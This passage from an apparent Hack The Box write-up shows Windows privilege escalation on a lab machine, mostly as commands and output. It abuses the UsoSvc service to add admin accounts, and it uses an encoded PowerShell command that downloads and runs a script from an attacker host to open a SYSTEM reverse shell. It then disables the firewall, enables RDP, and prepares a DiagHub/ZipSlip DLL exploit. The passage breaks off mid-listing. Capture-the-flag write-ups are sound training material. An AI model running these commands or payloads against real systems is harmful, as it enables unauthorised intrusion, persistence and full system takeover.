</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; Invoke-ServiceAbuse -ServiceName <span style="color:#f1fa8c">&#39;UsoSvc&#39;</span>

ServiceAbused Command
------------- -------
UsoSvc        net user john Password123! /add <span style="color:#ff79c6">&amp;&amp;</span> net localgroup Administrators john /add

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; Invoke-ServiceAbuse -ServiceName <span style="color:#f1fa8c">&#39;UsoSvc&#39;</span> -Command <span style="color:#f1fa8c">&#39;net user john2 Password123! /add&#39;</span>

ServiceAbused Command
------------- -------
UsoSvc        net user john2 Password123! /add

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; net user

User accounts <span style="color:#ff79c6">for</span> <span style="color:#f1fa8c">\\</span>

-------------------------------------------------------------------------------
Administrator            cam                      coby
DefaultAccount           Guest                    john
john2                    luke                     WDAGUtilityAccount
The <span style="color:#8be9fd;font-style:italic">command</span> completed with one or more errors.

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt;
</code></pre></td></tr></table>
</div>
</div><p>We can now change the binpath, but the service will have to be restarted</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; cmd /c <span style="color:#f1fa8c">&#39;sc config UsoSvc binpath=&#34;net user superuser Password123! /add&#34;&#39;</span>
<span style="color:#ff79c6">[</span>SC<span style="color:#ff79c6">]</span> ChangeServiceConfig SUCCESS
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; Restart-Service UsoSvc
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; Restart-Service : Service <span style="color:#f1fa8c">&#39;Update Orchestrator Service (UsoSvc)&#39;</span> cannot be started due to the following error: Cannot
start service UsoSvc on computer <span style="color:#f1fa8c">&#39;.&#39;</span>.
At line:1 char:1
+ Restart-Service UsoSvc
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: <span style="color:#ff79c6">(</span>System.ServiceProcess.ServiceController:ServiceController<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Restart-Service<span style="color:#ff79c6">]</span>
   , ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.RestartServiceCommand


PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; net user

User accounts <span style="color:#ff79c6">for</span> <span style="color:#f1fa8c">\\</span>

-------------------------------------------------------------------------------
Administrator            cam                      coby
DefaultAccount           Guest                    john
john2                    luke                     superuser
WDAGUtilityAccount
The <span style="color:#8be9fd;font-style:italic">command</span> completed with one or more errors.
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s run winPEAS.ps1 to observe john belongs to Admnistrator Group and observe UsoSvc:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> ADMINISTRATORS GROUPS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
Alias name     Administrators
Comment        Administrators have <span style="color:#8be9fd;font-style:italic">complete</span> and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
coby
john

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> UNQUOTED SERVICE PATHS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
  <span style="color:#ff79c6">[</span>?<span style="color:#ff79c6">]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
UsoSvc
 net user superuser Password123! /add
</code></pre></td></tr></table>
</div>
</div><p>We can therefore abuse the Service to get a privileged shell.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; cmd /c <span style="color:#f1fa8c">&#39;sc config UsoSvc binpath= &#34;cmd /c powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&#34; &#39;</span>
<span style="color:#ff79c6">[</span>SC<span style="color:#ff79c6">]</span> ChangeServiceConfig SUCCESS
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; sc.exe stop usosvc
<span style="color:#ff79c6">[</span>SC<span style="color:#ff79c6">]</span> ControlService FAILED 1062:

The service has not been started.

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; sc.exe start usosvc
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style="color:#bd93f9">8001</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8001</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">65528</span>
Windows PowerShell running as user RE$ on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;whoami
nt authority<span style="color:#f1fa8c">\s</span>ystem
</code></pre></td></tr></table>
</div>
</div><p>We observe the firewall is blocking remote desktop connection as port 3389 is filtered <code>nmap -p3389 10.10.10.144</code></p>
<p>Now Let&rsquo;s disable the firewall and enable Remote Desktop</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop&gt; netsh advfirewall <span style="color:#8be9fd;font-style:italic">set</span> allprofiles state off
Ok.
</code></pre></td></tr></table>
</div>
</div><p>Now port 3389 is closed, which is a good indicator the firewall is off.</p>
<p>We enable rdp by setting a registry key:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop&gt; reg add <span style="color:#f1fa8c">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span style="color:#bd93f9">0</span> /f
The operation completed successfully.
</code></pre></td></tr></table>
</div>
</div><p>The port is now open</p>
<h2 id="diaghub-exploit-attempt-to-elevate-privileges-from-iis-to-admin">DiagHub exploit: Attempt to elevate privileges from iis to admin</h2>
<h3 id="attack-description">Attack description</h3>
<p>We will use the <a href="https://github.com/decoder-it/diaghub_exploit">Diaghub</a> technique to get a Shell.</p>
<p>A pre-requisite is to find a location where we are authorized to copy our exploit: We found C:\ProgramData is a good place</p>
<ol>
<li>First we download the git project on CommandoVM, then open the solution in Visual Studio.</li>
<li>We edit FakeDll.cpp with a writeable path <code>C:\\ProgramData\\r.bat</code></li>
<li>We do the same in diaghub_exploit.cpp on top of LoadDll function</li>
<li>Change to Release</li>
<li>Build Solution</li>
<li><a href="https://stackoverflow.com/questions/42258311/cannot-open-include-file-ctype-h-no-such-file-or-directory">Troubleshoot</a>
<ol>
<li>Tools &gt; Tools and Features</li>
<li>Check &lsquo;Universal Windows Platform Development Tools&rsquo;</li>
<li>update the project properties for both FakeDll.cpp and diaghub_exploit.cpp
<ol>
<li>Windows SDK version = 10.0.18362.0</li>
<li>Platform Toolset = Visual Studio 2019 (v142)</li>
</ol>
</li>
<li>Rebuild</li>
</ol>
</li>
<li>Copy the Exploit on Target machine</li>
<li>ZipSlip attack to copy the malicious DLL within /windows/system32/ with admin privileges</li>
<li>diaghub exploit</li>
</ol>
<h3 id="zipslip-exploit-preparation">ZipSLip Exploit Preparation</h3>
<p>C:\windows\system32\ is not writeable by userpool, so we attempt zipslip by creating an evil zip with the tool <a href="https://github.com/ptoomey3/evilarc">evilarc on github</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git clone https://github.com/ptoomey3/evilarc
<span style="color:#8be9fd;font-style:italic">cd</span> evilarc
python evilarc.py -f zipslip.zip -o win -p <span style="color:#f1fa8c">&#34;windows\system32&#34;</span> ~/htb/http/diaghub/FakeDll.dll
<span style="color:#6272a4">#Creating zipslip.zip containing ..\..\..\..\..\..\..\..\windows\system32\FakeDll.dll</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="delivery-of-exploit">Delivery of exploit</h3>
<p>Instead of copying each file individually with wget, we prefer to create a samba share with impacket</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#ff79c6">(</span>v3<span style="color:#ff79c6">)</span> _  diaghub <span style="color:#8be9fd;font-style:italic">pwd</span>
/home/ctf/htb/http/diaghub
<span style="color:#ff79c6">(</span>v3<span style="color:#ff79c6">)</span> _  diaghub home/ctf/htb/v3/bin/smbserver.py -smb2support -username <span style="color:#8be9fd;font-style:italic">test</span> -password <span style="color:#8be9fd;font-style:italic">test</span> -port <span style="color:#bd93f9">8045</span> <span style="color:#8be9fd;font-style:italic">test</span> <span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">pwd</span><span style="color:#ff79c6">)</span>
bash: no such file or directory: home/ctf/htb/v3/bin/smbserver.py
<span style="color:#ff79c6">(</span>v3<span style="color:#ff79c6">)</span> _  diaghub /home/ctf/htb/v3/bin/smbserver.py -smb2support -username <span style="color:#8be9fd;font-style:italic">test</span> -password <span style="color:#8be9fd;font-style:italic">test</span> -port <span style="color:#bd93f9">8045</span> <span style="color:#8be9fd;font-style:italic">test</span> <span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">pwd</span><span style="color:#ff79c6">)</span>
Impacket v0.9.20 - Copyright <span style="color:#bd93f9">2019</span> SecureAuth Corporation

<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Config file parsed
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Callback added <span style="color:#ff79c6">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Callback added <span style="color:#ff79c6">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Config file parsed
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Config file parsed
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Config file parsed
</code></pre></td></tr></table>
</div>
</div><p>Now copying files for our exploit is much easier</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; cp z:/json/diaghub/* .
PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; cp z:/nc64.exe .
</code></pre></td></tr></table>
</div>
</div><p>We upload all the files necessary for the exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; ls

    Directory: C:<span style="color:#f1fa8c">\P</span>rogramData

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/19/2020  11:52 PM         <span style="color:#bd93f9">141312</span> dh.exe
-a----        2/19/2020  11:50 PM          <span style="color:#bd93f9">45272</span> nc64.exe
-a----        2/20/2020  12:04 AM             <span style="color:#bd93f9">52</span> r.bat
-a----        2/20/2020  12:01 AM         <span style="color:#bd93f9">500448</span> zipslip.zip

PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; net use z: <span style="color:#f1fa8c">\\</span>10.10.14.13<span style="color:#f1fa8c">\t</span>est /user:test <span style="color:#8be9fd;font-style:italic">test</span>
The <span style="color:#8be9fd;font-style:italic">command</span> completed successfully.
</code></pre></td></tr></table>
</div>
</div><h3 id="zipslip-attack">ZipSlip attack</h3>
<p>We launch our ZipSlip attack by copying our zip file into c:\proj_drop, then we control with cacls that the DLL is at the right location and belongs to NT Authority\system.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; cp zipslip.zip /proj_drop/
PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; ls /proj_drop
